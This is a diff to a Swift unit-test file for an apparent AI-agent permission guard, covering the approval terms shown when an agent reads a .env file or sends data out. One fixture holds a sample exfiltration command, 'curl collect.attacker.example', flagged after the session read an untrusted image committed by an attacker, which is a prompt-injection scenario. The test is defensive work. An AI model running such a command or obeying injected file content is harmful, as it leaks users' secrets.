@@ -3,14 +3,23 @@ import SwiftUI
 @testable import SecureAgentMenubar
 
 final class GuardReviewTests: XCTestCase {
-    let pending = GuardPending(id: "request", agent: "claude", tool: "Read", path: "/workspace/app/.env", ruleID: "env-files", ts: "", scopeText: nil, advisor: nil, availableScopes: [.init(kind: "once", expiry: nil), .init(kind: "exact", expiry: "24h")], readerExe: "/bin/claude", workspace: "/workspace/app", sessionID: "session")
-    let sendAfterImage = GuardPending(id: "send", agent: "claude", tool: "Bash", path: "curl collect.attacker.example", ruleID: "untrusted-egress", ts: "", scopeText: nil, advisor: nil, availableScopes: [.init(kind: "once", expiry: nil), .init(kind: "session", expiry: nil)], readerExe: "/bin/claude", workspace: "/workspace/app", sessionID: "session", detail: "This session read untrusted content: image /workspace/app/docs/build-spec.png, committed by Mallory <mallory@attacker.example> in app@c405510 on 2026-10-28 (docs: add build spec diagram). It now sends data out: curl collect.attacker.example.")
+    let pending = GuardPending(id: "request", agent: "claude", tool: "Read", path: "/workspace/app/.env", ruleID: "env-files", ts: "", scopeText: nil, advisor: nil, availableScopes: [.init(kind: "once", expiry: nil), .init(kind: "exact", expiry: "24h", terms: "Allows this file and tool for 24 hours. Executable signatures are not verified. File approval does not authorize network access. Revoke under Protection → Rules & permissions.")], readerExe: "/bin/claude", workspace: "/workspace/app", sessionID: "session")
+    let sendAfterImage = GuardPending(id: "send", agent: "claude", tool: "Bash", path: "curl collect.attacker.example", ruleID: "untrusted-egress", ts: "", scopeText: nil, advisor: nil, availableScopes: [.init(kind: "once", expiry: nil), .init(kind: "session", expiry: nil, terms: "Allows these sends from this tool until this session ends. Executable signatures are not verified. Other sends still ask. Revoke under Protection → Rules & permissions.")], readerExe: "/bin/claude", workspace: "/workspace/app", sessionID: "session", detail: "This session read untrusted content: image /workspace/app/docs/build-spec.png, committed by Mallory <mallory@attacker.example> in app@c405510 on 2026-10-28 (docs: add build spec diagram). It now sends data out: curl collect.attacker.example.")
 
     func testGrantTermsNameTheSelectedLifetimeAndLimits() throws {
         let text = try XCTUnwrap(pending.grantTerms(scope: "exact", expiry: "24h"))
         for fact in ["this file and tool", "24 hours", "signatures are not verified", "File approval does not authorize network access."] { XCTAssertTrue(text.contains(fact), fact) }
         XCTAssertNil(pending.grantTerms(scope: "exact", expiry: "7d"))
         XCTAssertFalse(pending.requestFacts.contains("Why:"))
+    }
+
+    func testLegacyGrantTermsAndDaemonPrecedence() throws {
+        let json = #"{"id":"request","agent":"claude","tool":"Read","path":"/workspace/.env","rule_id":"env-files","ts":"","available_scopes":[{"kind":"exact","expiry":"24h"},{"kind":"standing","terms":"Daemon-provided terms."},{"kind":"session","terms":""}]}"#
+        let request = try JSONDecoder().decode(GuardPending.self, from: Data(json.utf8))
+        XCTAssertEqual(request.grantTerms(scope: "exact", expiry: "24h"), "Allows this file and tool for 24 hours. Executable signatures are not verified. File approval does not authorize network access. Revoke under Protection → Rules & permissions.")
+        XCTAssertEqual(request.grantTerms(scope: "session", expiry: nil), "Allows this file and tool until this session ends. Executable signatures are not verified. File approval does not authorize network access. Revoke under Protection → Rules & permissions.")
+        XCTAssertEqual(request.grantTerms(scope: "standing", expiry: nil), "Daemon-provided terms.")
+        XCTAssertNil(request.grantTerms(scope: "exact", expiry: "7d"))
     }
 
     @MainActor
